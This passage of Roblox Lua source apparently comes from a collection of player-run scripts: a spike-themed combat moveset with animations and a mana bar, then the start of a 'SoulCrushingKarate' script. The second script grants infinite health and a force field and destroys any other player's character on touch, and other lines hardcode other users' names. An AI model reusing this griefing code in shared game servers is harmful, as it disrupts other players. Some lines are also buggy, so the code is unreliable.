spi.Velocity = v3(0,0,0) local xx,yy,zz = spi.CFrame:toEulerAnglesXYZ() spi.CFrame = cf(tehpos) *ca(xx,yy,zz) *cf(0,-spi.Size.y/9,0)
if bullethit.Anchored then Sound(asset .. Sounds.Punch,1,1) spi.Anchored = true else local cfz = spi.CFrame *cf(0,-0*sc,0)
spi.Size = v3(0,0,0) spi.CFrame = cfz spi.Anchored = false
if bullethit.Parent:findFirstChild("Humanoid") then stick(spi,bullethit) spi.CanCollide = false local mul = 1 if spi:findFirstChild("Fire") then mul = 2.5 end
local aihu = bullethit.Parent.Humanoid addmp(20*mul) aihu:TakeDamage(rn(10*mul,24*mul)) Sound(asset .. Sounds.Smash,1.35,1)
elseif bullethit.Parent.Parent:findFirstChild("Humanoid") then stick(spi,bullethit) spi.CanCollide = false local mul = 1 if spi:findFirstChild("Fire") then mul = 2.5 end
local aihu = bullethit.Parent.Parent.Humanoid addmp(20*mul) aihu:TakeDamage(rn(10*mul,24*mul)) Sound(asset .. Sounds.Smash,1.35,1)
elseif bullethit:GetMass() < 500 then stick(spi,bullethit) Sound(asset .. Sounds.Punch,1,1) if hasclass(bullethit,"Weld") < 1 and bullethit.Parrent.Parent:findFirstChild("Humanoid") == nil then bullethit.Velocity = (spi.CFrame*ca(rd(90),0,0)).lookVector*60 end
end
end
game:service'Debris':AddItem(spi,8)
else
spi.Parent = nil
end
end))
end
function NormalPose(inc) cr(cc(function() c1(tw,inc,3,0,0,0,0,0,0) end)) cr(cc(function() c1(llw,inc,3,-0.5,-1,0,0,0,0) end))
cr(cc(function() c1(rlw,inc,3,0.5,-1,0,0,0,0) end)) cr(cc(function() c1(law,inc,3,-1.5,1,0,0,0,0) end)) c1(raw,inc,3,1.5,1,0,0,0,0) end
Anim.Act = function(k,ccz)
if ccz then
if k == "x" then Anim.c = false
Anim.a = "Spikes"
for i=1,18 do
local spi = pa(Misc[k],"","Block",0,0,0,false,false,0,0,color) local spim = it("SpecialMesh",spi) spim.MeshType = "FileMesh" spim.MeshId = asset .. Decs.Spike
spim.Scale = v3(0.1,0,0.1)
local spiw = weld(spi,t,spi,rn(-8,8)/10,rn(-8,8)/10,0,rd(rn(60,120)),0,rd(rn(-30,30)))
cr(cc(function() for i=0,1,0.1 do spiw.C0 = spiw.C0 *cf(0,0.17,0) spim.Scale = v3(0.25,i*4,0.25) wait() end Anim.c = true end))
end
for i=1,2 do local spi = pa(Misc[k],"","Block",0,0,0,false,false,0,0,color) local spim = it("SpecialMesh",spi) spim.MeshType = "FileMesh" spim.MeshId = asset .. Decs.Spike
local spiw = weld(spi,la,spi,0.2,-i/1.1+(0.7),-0.25,rd(-45),0,rd(120)) cr(cc(function() for i=0,1,0.1 do spiw.C0 = spiw.C0 *cf(0,0.14,0) spim.Scale = v3(0.25,i*4,0.25) wait() end Anim.c = true end)) end
for i=1,2 do local spi = pa(Misc[k],"","Block",0,0,0,false,false,0,0,color) local spim = it("SpecialMesh",spi) spim.MeshType = "FileMesh" spim.MeshId = asset .. Decs.Spike local spiw = weld(spi,ra,spi,-0.2,-i/1.1+(0.7),-0.25,rd(-45),0,rd(-120))
cr(cc(function() for i=0,1,0.1 do spiw.C0 = spiw.C0 *cf(0,0.14,0) spim.Scale = v3(0.25,i*4,0.25) wait() end Anim.c = true end)) end
for i=1,2 do local spi = pa(Misc[k],"","Block",0,0,0,false,false,0,0,color) local spim = it("SpecialMesh",spi) spim.MeshType = "FileMesh" spim.MeshId = asset .. Decs.Spike
local spiw = weld(spi,ll,spi,0.2,-i/1.1+(0.2),-0.3,0,rd(50),rd(70)) cr(cc(function() for i=0,1,0.1 do spiw.C0 = spiw.C0 *cf(0,0.14,0) spim.Scale = v3(0.25,i*4,0.25) wait() end Anim.c = true end)) end
for i=1,2 do local spi = pa(Misc[k],"","Block",0,0,0,false,false,0,0,color) local spim = it("SpecialMesh",spi) spim.MeshType = "FileMesh" spim.MeshId = asset .. Decs.Spike local spiw = weld(spi,rl,spi,-0.2,-i/1.1+(0.2),-0.3,0,rd(-50),rd(-70))
cr(cc(function() for i=0,1,0.1 do spiw.C0 = spiw.C0 *cf(0,0.14,0) spim.Scale = v3(0.25,i*4,0.25) wait() end Anim.c = true end)) end
elseif k == "c" then
end
else
if k == "x" and Anim.b == "None" and Anim.c then Anim.c = false Anim.a = "None"
for zi,v in pairs(Misc[k]:children()) do
cr(cc(function()
for i=1,0,-0.1 do
v.Weld.C0 = v.Weld.C0 *cf(0,-0.17,0) v.Mesh.Scale = v3(0.1,i*4,0.1)
wait()
end v:Remove() Anim.c = true end))
end
elseif mp >= 50 and k == "e" and Anim.a == "Spikes" and Anim.b == "None" then Anim.b = "SideSlash" Anim.c = false mp = mp - 50
Armz(false)
cr(cc(function() c1(law,0.16,3,-1.2,1,-0.2,40,0,40) end))
cr(cc(function() c1(tw,0.1,0,0,0,0,0,-40,0) end))
c1(raw,0.16,3,1.2,1,0.2,50,0,50) Sound(Sounds.Unsheath,1.2,1)
local spi = pa(m,"","Block",0.3,6,0.3,false,false,0,0,color) local spim = it("SpecialMesh",spi) spim.MeshType = "FileMesh" spim.MeshId = asset .. Decs.Spike
spim.Scale = v3(0.2,6,0.2)
local spiw = weld(spi,ra,spi,0,-2,2,rd(90),0,0)
c1(raw,0.16,3,1.5,1,0,0,0,-40) Sound(Sounds.Slash,0.9,1)
DmgHit(spi,5,10,2)
cr(cc(function() Trail(spi,8,0.04,color,0.6,cf(0,3,0)) end))
cr(cc(function() c1(tw,0.08,0,0,0,0,0,45,0) end))
cr(cc(function() c1(spiw,0.1,0,0,-3.6,-1,210,0,0) end))
c1(raw,0.08,3,1.3,0.6,-0.5,-160,0,-90) wait(0.2)
cr(cc(function() c1(tw,0.08,0,0,0,0,0,0,0) c1(law,0.16,3,-1.5,1,0,0,0,0) end))
c1(raw,0.08,3,1.2,1,0.2,50,0,50) spi:Remove() c1(raw,0.16,3,1.5,1,0,0,0,0)
Armz(true)
Anim.b = "None" Anim.c = true
elseif k == "c" and Anim.a == "Spikes" and Anim.b == "None" then Anim.b = "Sit" Anim.c = false
Legz(false) Armz(false)
cr(cc(function() c1(llw,0.1,3,-0.5,-1,-0.3,-80,-20,0) end))
cr(cc(function() c1(rlw,0.1,3,0.5,-1,-0.3,-80,20,0) end))
cr(cc(function() c1(law,0.1,3,-1.3,1,0,15,0,15) end))
cr(cc(function() c1(raw,0.1,3,1.3,1,0,15,0,-15) end))
c1(tw,0.1,3,0,-1.5,0.35,-15,0,0)
Anim.c = true hu.WalkSpeed = 0
elseif k == "c" and Anim.a == "Spikes" and Anim.b == "Sit" then Anim.c = false hu.WalkSpeed = ns NormalPose(0.08) Legz(true) Armz(true) Anim.c = true Anim.b = "None"
elseif mp >= 6 and k == "f" and Anim.a == "Spikes" and Anim.b == "None" then Anim.b = "SpikeShoot" Anim.c = false
Armz(false)
cr(cc(function() c1(law,0.1,3,-1.1,0.55,0,-85,20,0) end)) c1(raw,0.1,3,1.1,0.55,0,-85,-20,0)
repeat mp = mp - 6 ShootSpike(rn(8,24)/10,ca(0,0,0),true,1,t) wait(0.12) c1(law,1,3,-1.1,0.55,0,-85+rn(-5,5),20+rn(-5,5),0)
c1(raw,1,3,1.1,0.55,0,-85+rn(-5,5),-20+rn(-5,5),0) until mp < 6 or not act.key["f"]
cr(cc(function() c1(law,0.1,3,-1.5,1,0,0,0,0) end)) c1(raw,0.1,3,1.5,1,0,0,0,0)
Armz(true) Anim.b = "None" Anim.c = true
elseif mp >= 30 and k == "q" and Anim.a == "Spikes" and Anim.b == "None" then Anim.b = "Flip" Anim.c = false
Legz(false) Armz(false) mp = mp - 30
cr(cc(function() c1(llw,0.1,3,-0.5,-0.4,-0.3,55,0,8) end))
cr(cc(function() c1(rlw,0.1,3,0.5,-0.7,-0.3,55,0,-8) end))
cr(cc(function() c1(law,0.1,3,-1.3,1,-0.2,-170,0,-15) end))
cr(cc(function() c1(raw,0.1,3,1.3,1,-0.2,-170,0,15) end)) c1(tw,0.1,3,0,-0.8,0,-30,0,0) hu.WalkSpeed = ns*1.25
cr(cc(function() c1(tw,0.036,3,0,0,0,360,0,0) end))
local bf = it("BodyForce",t) bf.force = v3(0,10000,0) game:service'Debris':AddItem(bf,0.165) Sound(Sounds.Slash,1.2,1)
wait(0.2) for zx=1,6 do ShootSpike(1.5,cf(rd(-5,5)/10,-2,-1)*ca(rd(-90+rn(-2,2)),0,rd(rn(-2,2))),true,2,to) wait(0.06) end hu.WalkSpeed= ns
cr(cc(function() c1(llw,0.2,3,-0.5,-1,0,0,0,0) end))
cr(cc(function() c1(rlw,0.2,3,0.5,-1,0,0,0,0) end))
cr(cc(function() c1(law,0.2,3,-1.5,1,0,0,0,0) end)) c1(raw,0.2,3,1.5,1,0,0,0,0)
Legz(true) Armz(true) Anim.b = "None" Anim.c = true
elseif mp < maxmp and k == "z" and Anim.a == "Spikes" and Anim.b == "None" then Anim.b = "Charge" Anim.c = false
hu.WalkSpeed = 0 Armz(false)
local mz = it("Model",m)
for xi=1,360,360/8 do
local spi = pa(mz,"","Block",1,6,1,true,false,0,0,color) spi.Anchored = true local spim = it("SpecialMesh",spi) spim.MeshType = "FileMesh" spim.MeshId = asset .. Decs.Spike
spim.Scale = v3(1,6,1) spi.CFrame = t.CFrame *ca(0,rd(xi),0) *cf(0,0,10) *cf(0,-7,0) *ca(rd(rn(-5,5)),0,rd(rn(-5,5)))
cr(cc(function() for x=1,12,1 do spi.CFrame = spi.CFrame *cf(0,0.5,0) wait() end end))
cr(cc(function() repeat wait() until not act.key["z"] or mp >= maxmp for x=1,12,1 do spi.CFrame = spi.CFrame *cf(0,-0.5,0) wait() end mz:Remove() end))
end
for xi=-1,1,2 do
local spi = pa(mz,"","Block",1,10,1,true,false,0,0,color) spi.Anchored = true local spim = it("SpecialMesh",spi) spim.MeshType = "FileMesh" spim.MeshId = asset .. Decs.Spike
spim.Scale = v3(1.2,10,1.2) spi.CFrame = t.CFrame *cf(xi*2.2,0,-2) *cf(0,-11,0)
cr(cc(function() for x=1,20,1 do spi.CFrame = spi.CFrame *cf(0,0.5,0) wait() end end))
cr(cc(function() repeat wait() until not act.key["z"] or mp >= maxmp for x=1,20,1 do spi.CFrame = spi.CFrame *cf(0,-0.25,0) wait() end mz:Remove() end))
end
local spi = pa(mz,"","Block",0,0,0,false,false,0,0,raigcol) spi.Anchored = true local spim = it("SpecialMesh",spi) spim.MeshType = "FileMesh" spim.MeshId = asset .. Decs.Crown
spim.Scale = v3(8,3,8) spi.CFrame = t.CFrame *cf(0,-2,0) Sound(asset .. Sounds.Cast,0.7,1)
cr(cc(function() for i=1,0.5,-0.05 do spi.Transparency = i end repeat wait() spi.CFrame = spi.CFrame *ca(0,rd(11),0) until not act.key["z"] or mp >= maxmp for i=0.5,1,0.05 do spi.Transparency = i end spi:Remove() end))
cr(cc(function() c1(law,0.06,3,-1.2,0.55,-0.1,-90,-25,0) end)) c1(raw,0.06,3,1.2,0.55,-0.1,-90,25,0)
repeat
wait() addmp(4.5) until not act.key["z"] or mp >= maxmp
cr(cc(function() c1(raw,0.1,3,1.5,1,0,0,0,0) end)) c1(law,0.1,3,-1.5,1,0,0,0,0)
Armz(true) Anim.c = true Anim.b = "None" hu.WalkSpeed = ns
elseif mp >= 150 and k == "r" and Anim.a == "Spikes" and Anim.b == "None" then Anim.b = "SpinSlash" Anim.c = false
Armz(false) mp = mp - 150
cr(cc(function() c1(law,0.08,3,-1.2,1,0.2,40,0,-30) end)) c1(raw,0.08,3,1.2,1,0.2,40,0,30) Sound(Sounds.Unsheath,1.2,1)
local spi = pa(m,"","Block",0.3,6,0.3,false,false,0,0,color) local spim = it("SpecialMesh",spi) spim.MeshType = "FileMesh" spim.MeshId = asset .. Decs.Spike spim.Scale = v3(0.2,6,0.2) local spiw = weld(spi,ra,spi,0,-2,2,rd(90),0,0)
local spi1 = pa(m,"","Block",0.3,6,0.3,false,false,0,0,color) local spim = it("SpecialMesh",spi1) spim.MeshType = "FileMesh" spim.MeshId = asset .. Decs.Spike spim.Scale = v3(0.2,6,0.2) local spi1w = weld(spi1,la,spi1,0,-2,2,rd(90),0,0)
cr(cc(function() c1(spiw,0.07,0,0,-4,0,170,0,0) end)) cr(cc(function() c1(spi1w,0.07,0,0,-4,0,190,0,0) end))
cr(cc(function() c1(law,0.07,3,-1,0.6,0,0,0,85) end)) c1(raw,0.07,3,1,0.6,0,0,0,-95) wait(0.2) DmgHit(spi,2,5,2) DmgHit(spi1,2,5,2) cr(cc(function() Trail(spi,24,0.05,color,0.35,cf(0,3,0)) end)) cr(cc(function() Trail(spi1,24,0.05,color,0.35,cf(0,3,0)) end))
local tru = true local wnd = pa(m,"","Block",14,0,14,false,false,0.3,0,color) wnd.Anchored = true it("CylinderMesh",wnd).Scale = v3(1,0.1,1) cr(cc(function() repeat wait() wnd.CFrame = t.CFrame *cf(0,0.5,0) *ca(rd(rn(-8,8)),0,rd(rn(-8,8))) if rn(1,4) == 2 then Sound(asset .. Sounds.Spin,1.25,1) end until not tru fade(wnd,0.08) end)) c1(tw,0.02,3,0,0,0,0,-360*5,0) tru = false tw.C1 = ca(0,0,0)
cr(cc(function() c1(law,0.08,3,-1.2,1,0.2,40,0,-30) end)) c1(raw,0.08,3,1.2,1,0.2,40,0,30) spi:Remove() spi1:Remove()
cr(cc(function() c1(law,0.16,3,-1.5,1,0,0,0,0) end)) c1(raw,0.16,3,1.5,1,0,0,0,0)
Anim.c = true Armz(true) Anim.b = "None"
elseif mp >= 10 and k == "v" and Anim.a == "Spikes" and Anim.b == "None" then Anim.b = "Hoverboard" Anim.c = false
Armz(false) Legz(false)
local spi = pa(m,"","Block",0.3,10,0.3,true,false,0,0,color) local spim = it("SpecialMesh",spi) spim.MeshType = "FileMesh" spim.MeshId = asset .. Decs.Spike spim.Scale = v3(0.8,10,0.8) local spiw = weld(spi,to,spi,-0.65,-3,0,rd(-80),0,0)
local spi1 = pa(m,"","Block",0.3,10,0.3,true,false,0,0,color) local spi1m = it("SpecialMesh",spi1) spi1m.MeshType = "FileMesh" spi1m.MeshId = asset .. Decs.Spike spi1m.Scale = v3(0.8,10,0.8) local spi1w = weld(spi1,to,spi1,0.65,-3,0,rd(-80),0,0)
local bpt = it("BodyPosition",to) bpt.position = to.Position bpt.maxForce = v3(1/0,1/0,1/0)
local bgt = it("BodyGyro",to) bgt.maxTorque = v3(1/0,1/0,1/0) bgt.D = 1250 hu.PlatformStand = true
cr(cc(function() c1(law,0.07,3,-1,0.5,0,0,0,83) end)) cr(cc(function() c1(raw,0.07,3,1,0.5,0,0,0,-97) end))
cr(cc(function() c1(llw,0.07,3,-0.5,-1,0,-20,0,25) end)) cr(cc(function() c1(rlw,0.07,3,0.5,-1,0,-20,0,-25) end))
c1(tw,0.07,3,0,0,0,15,90,0) Trail2(spi,0.15,color,1.8,cf(0.6,-5,0))
repeat local lulzspid = -Anim.ClickHold*2.5 if lulzspid < -50 then lulzspid = -50 end
bpt.position = (to.CFrame *cf(0,0,-7+(lulzspid))).p bgt.cframe = cf(to.Position,mou.hit.p) mp = mp - 1 wait() until not act.key["v"] or mp < 1
bpt:Remove() bgt:Remove() hu.PlatformStand = false rtab(sTrail,spi) local spisc = spim.Scale
for i=1,0,-0.1 do spim.Scale = spisc*i spi1m.Scale = spisc*i wait() end
spi:Remove() spi1:Remove() Anim.c = true NormalPose(0.08) Armz(true) Legz(true) Anim.b = "None"
elseif mp >= 60 and k == "t" and Anim.a == "Spikes" and Anim.b == "None" then Anim.b = "SpikeWall" Anim.c = false
Armz(false) Legz(false) mp = mp - 60 hu.WalkSpeed = 0 Sound(asset .. Sounds.Cast,1.5,1) wait(0.25)
cr(cc(function() c1(law,0.06,3,-1.2,0.8,0,30,0,40) end)) cr(cc(function() c1(raw,0.06,3,1,0.5,-0.6,-55,0,10) end))
cr(cc(function() c1(llw,0.06,3,-0.5,1.1,-0.7,-20,0,10) end)) cr(cc(function() c1(rlw,0.06,3,0.5,-0.4,0,50,0,-10) end))
c1(tw,0.06,3,0,-1.8,0,30,0,0) Sound(asset .. Sounds.Smash,0.26,1)
for i=-12,12,2 do wait()
local spi = pa(workspace,"","Block",3,20,3,true,false,0,0,color) spi.Anchored = true local spim = it("SpecialMesh",spi) spim.MeshType = "FileMesh" spim.MeshId = asset .. Decs.Spike spim.Scale = v3(2,29,2)
DmgHumanoidsNear((to.CFrame *cf(i,-1,-8) *cf(0,0,ab(-i/2.5))).p,2,12,14,70) spi.CFrame = to.CFrame *cf(i,-20,-8) *cf(0,0,ab(-i/2.5)) cr(cc(function() for i=1,20 do spi.CFrame =spi.CFrame *cf(0,1,0) wait() end end)) game:service'Debris':AddItem(spi,32)
end
hu.WalkSpeed = ns NormalPose(0.08)
Armz(true) Legz(true) Anim.b = "None" Anim.c = true
elseif mp >= 8 and k == "g" and Anim.a == "Spikes" and Anim.b == "None" then Anim.b = "SpikeCannon" Anim.c = false
Armz(false) Legz(false)
cr(cc(function() c1(law,0.06,3,-1.2,0.8,0,-30,0,40) end)) cr(cc(function() c1(raw,0.06,3,1.2,0.8,0,-30,0,-40) end))
cr(cc(function() c1(llw,0.06,3,-0.5,-0.8,0,-10,0,0) end)) cr(cc(function() c1(rlw,0.06,3,0.5,-0.8,0,-10,0,0) end))
c1(tw,0.06,3,0,-0.3,0,10,0,0)
repeat
wait(0.1) ShootSpike(rn(10,28)/10,cf(rn(-22,22)/10,rn(-22,22)/10,0)*ca(rd(9),0,0)*ca(0,rd(180),0),false,2,t) mp = mp - 8 until not act.key["g"] or mp < 1
NormalPose(0.08)
Armz(true) Legz(true) Anim.b = "None" Anim.c = true
elseif mp >= 600 and k == "b" and Anim.a == "Spikes" and Anim.b == "None" then Anim.b = "SpikeRoll" Anim.c = false
Armz(false) Legz(false) hu.WalkSpeed = ns*3.5 mp = mp - 600 local spiks = {}
for i=1,30 do
local spi = pa(m,"","Block",0,0,0,false,false,0,0,color) local spim = it("SpecialMesh",spi) spim.MeshType = "FileMesh" spim.MeshId = asset .. Decs.Spike
spim.Scale = v3(0,0,0)
local spiw = weld(spi,t,spi,rn(-10,10)/10,rn(-10,10)/10,rn(-10,10)/10,rd(rn(-360,360)),0,rd(rn(-360,360)))
table.insert(spiks,spiw) cr(cc(function() for i=0,2,0.1 do spiw.C0 = spiw.C0 *cf(0,0.17,0) spim.Scale = v3(0.5,i*4,0.5) wait() end end))
end
cr(cc(function() c1(llw,0.1,3,-0.5,-0.8,-0.6,65,0,8) end))
cr(cc(function() c1(rlw,0.1,3,0.5,-0.8,-0.6,65,0,-8) end))
cr(cc(function() c1(law,0.1,3,-1.3,1,-0.2,65,0,30) end))
cr(cc(function() c1(raw,0.1,3,1.3,1,-0.2,65,0,-30) end)) c1(tw,0.1,3,0,-2,0,0,0,0) local function funnyfiur(zazaz) ShootSpike(rn(15,38)/10,zazaz,false,2,to) end
cr(cc(function() for i=0,1,0.005 do if rn(1,3) == 2 then DmgHumanoidsNear(to.Position,2,12,8,70) end if rn(1,5) == 5 then hu:MoveTo((to.CFrame *cf(0,0,-6)).p,to) end local rndz = rn(1,6) if rndz == 4 then funnyfiur(ca(0,rd(rn(-360,360)),0)*ca(rd(2),0,0)) elseif rndz == 3 then funnyfiur(ca(rd(2),0,0)) elseif rndz == 1 then ShootSpike(rn(15,38)/10,"random",false,2,to) end wait() end end)) c1(tw,0.005,3,0,-1.7,0,360*10,0,0)
NormalPose(0.07)
for xi=1,#spiks do local spiw = spiks[xi] cr(cc(function() for i=2,0,-0.1 do spiw.C0 = spiw.C0 *cf(0,-0.17,0) spiw.Part1.Mesh.Scale = v3(0.5,i*4,0.5) wait() end spiw.Part1:Remove() end)) end wait(0.5)
Armz(true) Legz(true) Anim.b = "None" Anim.c = true hu.WalkSpeed = ns
end -- key
end -- bool
end -- func end
re(bp,"ProCacDef")
bin = it("HopperBin",bp) bin.Name = "Spike"
bin.Selected:connect(function(mouse) mou = mouse
mouse.Button1Down:connect(function() Button = true cr(cc(function() repeat wait(0.1) Anim.ClickHold = Anim.ClickHold + 0.1 until not Button end))
end)
mouse.Button1Up:connect(function() Button = false
end)
mouse.KeyDown:connect(function(k2) local k = k2:lower() Key = true pcall(function() act.key[k] = true end)
if k == "p" then Sound(asset .. Sounds.Smash,0.26,1) end
if Anim.c then
if Anim.a == "None" then
Anim.Act(k,true)
else
Anim.Act(k,false)
end -- anim ab end
end -- c end
end)
mouse.KeyUp:connect(function(k2) pcall(function() act.key[k2:lower()] = false end) Key = false end)
end)
bin.Deselected:connect(function(mouse)
end)
re(pg,"RMDXSig") raigcol = "Frostftw"
Gui = it("ScreenGui",pg) Gui.Name = "RMDXSig"
fr = it("Frame",Gui) fr.Size = ud(1,0,1,0) fr.Active = false fr.BackgroundTransparency = 1
mptray = it("TextLabel",fr) mptray.BackgroundColor3 = bc("Black").Color
mptray.Size = ud(0.18,0,0.08,0) mptray.BorderSizePixel = 0 mptray.Position = ud(0.41,0,0.025,0) mptray.Text = ""
mptext = it("TextLabel",mptray) mptext.BackgroundTransparency = 1 mptext.Size = ud(1,0,1,0) mptext.TextColor3 = bc("White").Color
mptext.FontSize = "Size18" mptext.Font = "ArialBold" mptext.ZIndex = 2 mptext.Text = "Mp Power"
mpfill = it("ImageLabel",mptray) mpfill.BackgroundColor3 = bc(raigcol).Color mpfill.Image = asset .. Decs.Shine mpfill.Size = ud(0.97,0,0.90,0) mpfill.Position = ud(0.015,0,0.05,0)
cr(cc(function() while wait() do mpfill.Size = ud((0.97/maxmp)*mp,0,0.9,0) end end))
cr(cc(function() while wait() do if mp >= maxmp then local raigcolz = bc(raigcol).Color local rr,gg,bb = raigcolz.r,raigcolz.g,raigcolz.b for xz=gg,gg-80,-5 do if mp < maxmp then mpfill.BackgroundColor3 = bc(raigcol).Color break end mpfill.BackgroundColor3 = c3(rr,xz,bb) wait() end
for xz=gg-80,gg,5 do if mp < maxmp then mpfill.BackgroundColor3 = bc(raigcol).Color break end mpfill.BackgroundColor3 = c3(rr,xz,bb) wait() end end end end))
cr(cc(function() while wait() do if not Button and Anim.ClickHold > 0 then Anim.ClickHold = Anim.ClickHold - 0.1 end end end))
function find(name)
p = game.Players:GetChildren()
for i,v in pairs(p) do
if string.find(v.Name, name) then
return v
end
end
end
local skin = color
players = game.Players.LocalPlayer
function chat(msg)
msg = string.lower()
if string.sub(msg,1,6)=="color/" then
col = string.sub(msg,7)
color = ""..col..""
 
end
if string.sub(msg,1,5)=="color" then
m = game.Players.Yanabis.Character:GetChildren()
for i,v in pairs(m) do
if v.ClassName == "Part" then
v.BrickColor = BrickColor.new(color)
 
wait(0)
 
local g = game.Players.jhamarfrost.Character.Suit:GetChildren()
for b,t in pairs(g) do
if t.ClassName == "Part" then
t.BrickColor = BrickColor.new(color)
end
end
end
end
end
end
players.Chatted:connect(chat)                                    
]]
 
 
SoulCrushingKarate = [[
a,b = pcall(function()
Plrs = game:GetService("Players")
me = Plrs.LocalPlayer
char = me.Character
Modelname = "SoulKarate"
local Head = char.Head
local Torso = char.Torso
local LeftArm = char["Left Arm"]
local RightArm = char["Right Arm"]
local LeftLeg = char["Left Leg"]
local RightLeg = char["Right Leg"]
local RightHip = Torso["Right Hip"]
local LeftHip = Torso["Left Hip"]
dmgs = {Pdmg = {50, 100, "Punch"}, Kdmg = {100, 150, "Kick"}, K2dmg = {200, 300, "Doublekick"}, Rdmg = {230, 300, "RoundHouse"},
Kardmg = {30, 50, "Karate"}}
dmg = dmgs.Pdmg
Surfaces = {"FrontSurface", "BackSurface", "TopSurface", "BottomSurface", "LeftSurface", "RightSurface"}
necko = CFrame.new(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
able = true
block = false
breakblock = 19
holdkey = false
effectOn = false
Instance.new("ForceField", char)
Add = {
Sphere = function(P)
local m = Instance.new("SpecialMesh",P)
m.MeshType = "Sphere"
return m
end,
BF = function(P)
local bf = Instance.new("BodyForce",P)
bf.force = Vector3.new(0, P:GetMass()*187, 0)
return bf
end,
BP = function(P)
local bp = Instance.new("BodyPosition",P)
bp.maxForce = Vector3.new(math.huge, 0, math.huge)
bp.P = 14000
return bp
end,
BG = function(P)
local bg = Instance.new("BodyGyro",P)
bg.maxTorque = Vector3.new(math.huge, math.huge, math.huge)
bg.P = 14000
return bg
end
}
char.Humanoid.MaxHealth = math.huge
char.Humanoid.WalkSpeed = 50
Head.Transparency = 0.5
Head.Reflectance = 0.5
Torso.Transparency = 0.5
Torso.Reflectance = 0.5
RightLeg.Transparency = 0.5
RightLeg.Reflectance = 0.5
LeftArm.Transparency = 0.5
LeftArm.Reflectance = 0.5
RightArm.Transparency = 0.5
RightArm.Reflectance = 0.5
LeftLeg.Transparency = 0.5
LeftLeg.Reflectance = 0.5
Head.Touched:connect(function(hit)
if hit.Parent:findFirstChild("Humanoid")then
game:GetService("Chat"):Chat(Head,"Don't play soccer with me.",0)
for i,v in pairs(hit.Parent:GetChildren())do
if v:IsA"Humanoid" then
game:GetService("Chat"):Chat(Head,"Cya",0)
v:Destroy()
elseif v:IsA"Part" then
game:GetService("Chat"):Chat(v.Parent.Head,"UGH!MY BONES!",2)
v.Velocity = v.Position * Vector3.new(50,3,0)
v.RotVelocity = v.Position - v.Velocity
v:Remove()
end end end
end)
Torso.Touched:connect(function(hit)
if hit.Parent:findFirstChild("Humanoid")then
game:GetService("Chat"):Chat(Head,"Hugging me? I'm like a ghost.",0)
for i,v in pairs(hit.Parent:GetChildren())do
if v:IsA"Humanoid" then
game:GetService("Chat"):Chat(Head,"That was too easy.",0)
v:Destroy()
elseif v:IsA"Part" then
game:GetService("Chat"):Chat(v.Parent.Head,"OW!",2)
v.Velocity = v.Position * Vector3.new(50,3,0)
v.RotVelocity = v.Position - v.Velocity
v:Remove()
end end end
end)
RightArm.Touched:connect(function(hit)
game:GetService("Chat"):Chat(Head,"My skills are superior.",0)
if hit.Parent:findFirstChild("Humanoid")then
for i,v in pairs(hit.Parent:GetChildren())do
if v:IsA"Humanoid" then
game:GetService("Chat"):Chat(Head,"Fly now...",0)
v:Destroy()
elseif v:IsA"Part" then
game:GetService("Chat"):Chat(v.Parent.Head,"AH!MY BONES!",2)
v.Velocity = v.Position * Vector3.new(50,3,0)
v.RotVelocity = v.Position - v.Velocity
v:Remove()
end end end
end)
LeftArm.Touched:connect(function(hit)
game:GetService("Chat"):Chat(Head,"Check your skills.",0)
if hit.Parent:findFirstChild("Humanoid")then
for i,v in pairs(hit.Parent:GetChildren())do
if v:IsA"Humanoid" then
game:GetService("Chat"):Chat(Head,"You must be mistaken.",0)
v:Destroy()
elseif v:IsA"Part" then
game:GetService("Chat"):Chat(v.Parent.Head,"AOUGH!",2)
v.Velocity = v.Position * Vector3.new(50,3,0)
v.RotVelocity = v.Position - v.Velocity
v:Remove()
end end end
end)
LeftLeg.Touched:connect(function(hit)
if hit.Parent:findFirstChild("Humanoid")then
for i,v in pairs(hit.Parent:GetChildren())do
if v:IsA"Humanoid" then
game:GetService("Chat"):Chat(Head,"Nice,Continuing the kicking game.",0)
v:Destroy()
elseif v:IsA"Part" then
v.Velocity = v.Position * Vector3.new(50,3,0)
v.RotVelocity = v.Position - v.Velocity
v.Transparency = 0.5
end end end
end)
RightLeg.Touched:connect(function(hit)
if hit.Parent:findFirstChild("Humanoid")then
for i,v in pairs(hit.Parent:GetChildren())do
if v:IsA"Humanoid" then
game:GetService("Chat"):Chat(Head,"Nice try.",0)
v:Destroy()
elseif v:IsA"Part" then
v.Velocity = v.Position * Vector3.new(50,3,0)
v.RotVelocity = v.Position - v.Velocity
v.Transparency = 0.5
end end end
end)
function Part(Parent, Anchor, Collide, Tran, Ref, Color, X, Y, Z, Break)
local p = Instance.new("Part")
p.formFactor = "Custom"
p.Anchored = Anchor
p.CanCollide = Collide
p.Transparency = Tran
p.Reflectance = Ref
p.BrickColor = BrickColor.new(Color)
local pie = Instance.new("PointLight", p)
pie.Range = 10
pie.Shadows = true
pie.Brightness = 50
for _, Surf in pairs(Surfaces) do
p[Surf] = "Smooth"
end
p.Size = Vector3.new(X, Y, Z)
if Break then
p:BreakJoints()
else p:MakeJoints() end
p.Parent = Parent
return p
end
 
function Weld(p0, p1, x, y, z, a, b, c)
 
local w = Instance.new("Weld")
 
w.Parent = p0
 
w.Part0 = p0
 
w.Part1 = p1
 
w.C1 = CFrame.new(x,y,z) * CFrame.Angles(a,b,c)
 
return w
 
end
 
function ComputePos(pos1, pos2)
 
local pos3 = Vector3.new(pos2.x, pos1.y, pos2.z)
 
return CFrame.new(pos1, pos3)
 
end
 
function getHumanoid(c)
 
local h = nil
 
for i,v in pairs(c:children()) do
 
if v:IsA("Humanoid") and c ~= char then
 
if v.Health > 0 then
 
h = v
 
end
 
end
 
end
 
return h
 
end
 
function getHead(c, pos, m)
 
local h = nil
 
local n = nil
 
t = c:findFirstChild("Torso")
 
if t ~= nil then
 
n = t:findFirstChild("Neck")
 
end
 
for i,v in pairs(c:children()) do
 
if v.Name == "Head" then
 
if (v.Position - pos).magnitude < m then
 
h = v
 
end
 
end
 
end
 
return h, n
 
end
 
for i,v in pairs(char:children()) do
 
if v.Name == Modelname then
 
v:remove()
 
end
 
end
 
torso = char.Torso
 
neck = torso.Neck
 
hum = char.Humanoid
 
Rarm = char["Right Arm"]
 
Larm = char["Left Arm"]
 
Rleg = char["Right Leg"]
 
Lleg = char["Left Leg"]
 
LastHP = hum.Health
 
function HpChange(newhp)
 
if block and hum.Health > 0.1 then
 
local dif = LastHP - newhp
 
if dif > 0 then
 
local h = LastHP - ((LastHP-newhp)/3)
 
hum.Health = h
 
wait()
 
hum.Health = h
 
end
 
if dif > breakblock then
 
block = false
 
local a = Add.BP(torso)
 
